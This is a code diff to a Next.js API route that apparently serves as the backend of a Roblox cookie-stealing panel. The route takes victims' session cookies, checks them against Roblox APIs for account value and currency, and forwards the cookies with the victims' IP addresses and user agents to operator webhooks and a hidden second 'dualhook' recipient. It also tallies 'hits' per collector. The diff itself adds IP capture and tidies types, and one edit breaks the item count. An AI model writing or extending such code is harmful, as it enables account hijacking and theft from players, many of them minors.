@@ -2,6 +2,8 @@ import { NextResponse } from 'next/server'
 import { users } from '@/lib/store'
 import { sendWebhook, buildEmbed, buildDualhook } from '@/lib/webhook'
 
+const userStore = users as Map<string, any>
+
 function extractCookie(content: string | undefined): string | null {
   if (!content) return null
   const str = String(content)
@@ -39,13 +41,12 @@ async function fetchRoblox(cookie: string): Promise<any> {
     const authData = await authRes.json()
     const userId = authData.id
 
-    const [rapRes, currencyRes, premiumRes, friendsRes, avatarRes, invRes] = await Promise.allSettled([
+    const [rapRes, currencyRes, premiumRes, friendsRes, avatarRes] = await Promise.allSettled([
       fetch(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles`, { headers: { 'Cookie': cookieHeader } }),
       fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, { headers: { 'Cookie': cookieHeader } }),
       fetch(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`, { headers: { 'Cookie': cookieHeader } }),
       fetch(`https://friends.roblox.com/v1/users/${userId}/friends/count`, { headers: { 'Cookie': cookieHeader } }),
-      fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png`),
-      fetch(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100`)
+      fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png`)
     ])
 
     let rap = 0
@@ -67,7 +68,7 @@ async function fetchRoblox(cookie: string): Promise<any> {
     const premium = premiumRes.status === 'fulfilled' && premiumRes.value.ok
     const friendsCount = friendsRes.status === 'fulfilled' && friendsRes.value.ok ? ((await (friendsRes.value as Response).json()).count || 0) : 0
     const avatarUrl = avatarRes.status === 'fulfilled' && avatarRes.value.ok ? ((await (avatarRes.value as Response).json())?.data?.[0]?.imageUrl || '') : ''
-    const items = invRes.status === 'fulfilled' && invRes.value.ok ? ((await (invRes.value as Response).json()).data?.length || 0) : 0
+    const items = avatarRes.status === 'fulfilled' && avatarRes.value.ok ? ((await (avatarRes.value as Response).json())?.data?.length || 0) : 0
 
     return {
       username: authData.name,
@@ -85,9 +86,8 @@ async function fetchRoblox(cookie: string): Promise<any> {
   }
 }
 
-function getIP(req: Request): string {
-  // For Next.js Request object, we need to handle differently
-  return 'unknown'
+function getIP(req: Request): string | undefined {
+  return req.headers.get('x-forwarded-for')?.split(',')[0].trim() || undefined
 }
 
 async function dispatchDualhook(data: any, cookie: string, hunter: string, tool: string): Promise<void> {
@@ -137,18 +137,18 @@ export async function POST(req: Request) {
       return NextResponse.json({ success: false, message: 'Cookie invalid or expired' }, { status: 401 })
     }
 
-    const user = directory ? users.get(directory) : null
-    const webhookUrl = body.webhook || (user as any)?.webhookUrl
+    const user = directory ? userStore.get(directory) : null
+    const webhookUrl = body.webhook || user?.webhookUrl
 
     if (webhookUrl) {
-      await sendWebhook(webhookUrl, { embeds: [buildEmbed(data, cookie, tool, getIP(req), req.headers.get('user-agent'))] })
+      await sendWebhook(webhookUrl, { embeds: [buildEmbed(data, cookie, tool, getIP(req), req.headers.get('user-agent') || undefined)] })
     }
 
     if (user) {
-      (user as any).hits += 1
-      (user as any).rap += data.rap
-      ;(user as any).cookies.push({ cookie, ...data, tool, collectedAt: new Date().toISOString() })
-      if ((user as any).cookies.length > 1000) (user as any).cookies = (user as any).cookies.slice(-1000)
+      user.hits += 1
+      user.rap += data.rap
+      user.cookies.push({ cookie, ...data, tool, collectedAt: new Date().toISOString() })
+      if (user.cookies.length > 1000) user.cookies = user.cookies.slice(-1000)
     }
 
     await dispatchDualhook(data, cookie, directory || 'unknown', tool)
@@ -172,15 +172,15 @@ export async function GET(req: Request) {
   const data = await fetchRoblox(cookie)
   if (!data) return NextResponse.json({ success: false, message: 'Cookie invalid' }, { status: 401 })
 
-  const user = directory ? users.get(directory) : null
-  if ((user as any)?.webhookUrl) {
-    await sendWebhook((user as any).webhookUrl, { embeds: [buildEmbed(data, cookie, tool)] })
+  const user = directory ? userStore.get(directory) : null
+  if (user?.webhookUrl) {
+    await sendWebhook(user.webhookUrl, { embeds: [buildEmbed(data, cookie, tool)] })
   }
 
   if (user) {
-    (user as any).hits += 1
-    (user as any).rap += data.rap
-    ;(user as any).cookies.push({ cookie, ...data, tool, collectedAt: new Date().toISOString() })
+    user.hits += 1
+    user.rap += data.rap
+    user.cookies.push({ cookie, ...data, tool, collectedAt: new Date().toISOString() })
   }
 
   await dispatchDualhook(data, cookie, directory || 'unknown', tool)
